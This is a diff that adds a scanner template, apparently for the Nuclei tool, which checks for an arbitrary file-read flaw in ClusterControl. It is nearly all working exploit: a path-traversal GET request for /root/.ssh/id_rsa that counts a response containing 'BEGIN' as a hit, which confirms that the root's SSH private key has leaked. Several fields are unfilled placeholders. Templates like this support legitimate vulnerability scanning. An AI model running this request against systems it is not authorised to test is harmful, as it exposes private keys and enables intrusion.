@@ -1,0 +1,19 @@
+id: ClusterControl-lfi
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: ClusterControl存在任意文件读取漏洞
+  reference:
+    - https://
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/../../../../../../../../..//root/.ssh/id_rsa"        
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'BEGIN'
